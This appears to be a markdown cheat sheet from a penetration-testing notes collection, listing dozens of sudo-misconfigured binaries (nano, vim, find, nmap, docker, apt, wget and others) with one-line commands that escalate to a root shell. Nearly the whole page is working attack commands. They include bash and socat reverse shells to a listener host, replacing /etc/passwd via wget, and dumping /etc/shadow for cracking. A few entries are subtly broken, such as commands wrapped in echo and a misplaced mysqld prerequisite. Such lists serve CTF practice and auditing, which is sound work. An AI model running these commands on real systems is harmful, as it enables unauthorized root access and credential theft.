# Linux Privilege Escalation with Misconfigured sudo
[< Back to Menu](README.md)
<!-- ------------------------------------------- -->
## help
Any binary that support `help` and utilize `less` pager can be elevated privilege.
Prerequisite: `help` with `less` pager
```bash
sudo some_binary help
```
after that, type `!/bin/sh` in the help manual.
<!-- ------------------------------------------- -->
## .sh file
> (root) NOPASSWD: /home/anyfile.sh
- Append/Replace /bin/bash -i to the file and execute to get root shell
```bash
echo "/bin/bash -i >> /home/anyfile.sh"
/home/anyfile.sh
```
<!-- ------------------------------------------- -->
## nano
> (root) NOPASSWD: /usr/bin/nano
- Open nano with sudo
- Press `^R Read File` and then `^X Execute Command`
- Then type `reset; sh 1>&0 2>&0` and enter and wait for `#` to be shown
- Then, you got the root shell
```bash
sudo nano
^R
^X
`reset; sh 1>&0 2>&0`
```
<!-- ------------------------------------------- -->
## find
> (root) NOPASSWD: /usr/bin/find
```bash
sudo find /etc/passwd -exec /bin/bash \;
```
<!-- ------------------------------------------- -->
## Nmap 
> (root) NOPASSWD: /usr/bin/nmap
- Method 1 - The input will be invisible, but still executable.
```bash
echo "(function() os.execute('/bin/bash -i') end)()" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
```
- Method 2 - Use reverse shell method so that the input will not be invisible anymore.
```bash
echo "(function() os.execute('/bin/bash -c \"bash -i >& /dev/tcp/<target_ip>/<target_port> 0>&1\"') end)()" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
```
<!-- ------------------------------------------- -->
## env 
> (root) NOPASSWD: /usr/bin/env
```bash
sudo env /bin/bash
```
<!-- ------------------------------------------- -->
## vim
> (root) NOPASSWD: /usr/bin/vim <br>
> (root) NOPASSWD: /usr/bin/vi
```bash
sudo vim -c ':!/bin/bash'
```
<!-- ------------------------------------------- -->
## awk
> (root) NOPASSWD: /usr/bin/awk
```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```
<!-- ------------------------------------------- -->
## sed
> (root) NOPASSWD: /usr/bin/sed
```bash
sudo sed -n '1e exec sh 1>&0' /etc/passwd
```
<!-- ------------------------------------------- -->
## perl
> (root) NOPASSWD: /usr/bin/perl
```bash
sudo perl -e 'exec "/bin/bash";'
```
<!-- ------------------------------------------- -->
## python3
> (root) NOPASSWD: /usr/bin/python3
```bash
sudo python -c 'import pty;pty.spawn("/bin/bash")'
```
<!-- ------------------------------------------- -->
## less
> (root) NOPASSWD: /usr/bin/less
```bash
sudo less /etc/hosts
```
After that, type `!bash` inside it.
<!-- ------------------------------------------- -->
## man
> (root) NOPASSWD: /usr/bin/man
```bash
sudo man man
```
After that, type `!bash` inside it.
<!-- ------------------------------------------- -->
## ftp
> (root) NOPASSWD: /usr/bin/ftp
```bash
sudo ftp
```
After that, type `! /bin/bash` inside it.
<!-- ------------------------------------------- -->
## socat
> (root) NOPASSWD: /usr/bin/socat
This requires reverse shell approach
- Local Host (For receiving connection - hacker)
```bash
socat file:`tty`,raw,echo=0 tcp-listen:<Local Port>
```
- Remote Host (Victim or Target)
```bash
sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:<Target IP>:<Target Port>
```
<!-- ------------------------------------------- -->
## zip
> (root) NOPASSWD: /usr/bin/zip
```bash
echo "test" > /tmp/test && sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
```
<!-- ------------------------------------------- -->
## gcc
> (root) NOPASSWD: /usr/bin/gcc
```bash
echo "sudo gcc -wrapper /bin/bash,-s ."
```
<!-- ------------------------------------------- -->
## docker
> (root) NOPASSWD: /usr/bin/docker
Prerequisite: `docker` daemon must be running.
```bash
sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
<!-- ------------------------------------------- -->
## mysql
> (root) NOPASSWD: /usr/bin/mysql
Prerequisite: `mysqld` daemon must be running.
```bash
sudo mysql -e '\! /bin/sh'
```
<!-- ------------------------------------------- -->
## ssh
> (root) NOPASSWD: /usr/bin/ssh
Prerequisite: `mysqld` daemon must be running.
```bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```
<!-- ------------------------------------------- -->
## tmux
> (root) NOPASSWD: /usr/bin/tmux
```bash
sudo tmux
```
<!-- ------------------------------------------- -->
## pkexec
> (root) NOPASSWD: /usr/bin/pkexec
```bash
sudo pkexec /bin/bash
```
<!-- ------------------------------------------- -->
## rlwrap
> (root) NOPASSWD: /usr/bin/rlwrap
```bash
sudo rlwrap /bin/bash
```
<!-- ------------------------------------------- -->
## xargs
> (root) NOPASSWD: /usr/bin/xargs
```bash
sudo xargs -a /dev/null sh
```
<!-- ------------------------------------------- -->
## anansi_util
> (root) NOPASSWD: /home/anansi/bin/anansi_util
```bash
sudo /home/anansi/bin/anansi_util manual /bin/bash 
```
<!-- ------------------------------------------- -->
## apt-get
> (root) NOPASSWD: /usr/bin/apt-get
```bash
 sudo apt-get update -o APT::Update::Pre-Invoke::="/bin/bash -i" 
```
<!-- ------------------------------------------- -->
## apt
> (root) NOPASSWD: /usr/bin/apt
```bash
TF=$(mktemp)
echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF
sudo apt install -c $TF sl
```
<!-- ------------------------------------------- -->
## flask
> (root) NOPASSWD: /usr/bin/flask
```bash
cd /tmp
echo 'import pty; pty.spawn("/bin/bash")' > app.py
export FLASK_APP=flask
sudo /usr/bin/flask run
```
<!-- ------------------------------------------- -->
## wget
> (root) NOPASSWD: /usr/bin/wget
- Modify the copied of /etc/passwd with given password and then replace the original using wget.
- Replace "x" with custom generated hash and use that generated password to login as root.
```bash
sudo wget <url that host passwd file> -O /etc/passwd
```
<!-- ------------------------------------------- -->
## apache2
> (root) NOPASSWD: /usr/sbin/apache2
- Use apache2 to access root protected file such as /etc/shadow
- Crack the hash to get password
```bash
sudo apache2 -f /etc/shadow
```
<!-- ------------------------------------------- -->
## aa-exec
> (root) NOPASSWD: /usr/bin/aa-exec
```bash
sudo aa-exec /bin/sh -i
```
<!-- ------------------------------------------- -->
## ansible-playbook
> (root) NOPASSWD: /usr/bin/ansible-playbook
```bash
TF=$(mktemp)
echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
sudo ansible-playbook $TF
```
<!-- ------------------------------------------- -->
## ansible-test
> (root) NOPASSWD: /usr/bin/ansible-test
```bash
sudo ansible-test shell
```
<!-- ------------------------------------------- -->
## aoss
> (root) NOPASSWD: /usr/bin/aoss
```bash
sudo aoss /bin/sh
```
<!-- ------------------------------------------- -->
## aoss
> (root) NOPASSWD: /usr/bin/ash
```bash
sudo ash
```
<!-- ------------------------------------------- -->
## at
> (root) NOPASSWD: /usr/bin/at
Prerequisite: `atd must be running`
```bash
echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now; tail -f /dev/null
```
<!-- ------------------------------------------- -->
## bundle
> (root) NOPASSWD: /usr/local/bin/bundle<br>
> (root) NOPASSWD: /usr/local/bin/bundler
- Method 1
```bash
TF=$(mktemp -d)
touch $TF/Gemfile
cd $TF
sudo bundle exec /bin/sh
```
- Method 2
```bash
export BUNDLE_GEMFILE=x
sudo bundle exec /bin/sh
```
- Method 3
```bash
TF=$(mktemp -d)
touch $TF/Gemfile
cd $TF
sudo bundle console
```
After that type `system('/bin/sh -c /bin/sh')` on bundle console

- Method 4
```bash
TF=$(mktemp -d)
echo 'system("/bin/sh")' > $TF/Gemfile
cd $TF
sudo bundle install
```
<!-- ------------------------------------------- -->
## busctl
> (root) NOPASSWD: /usr/bin/busctl
```bash
sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
<!-- ------------------------------------------- -->
```
## busybox
> (root) NOPASSWD: /usr/bin/busybox
```bash
sudo busybox sh
```
## GTFOBins
For more commands to be exploited, go to [GTFOBins](https://gtfobins.github.io/#+shell%20+Sudo)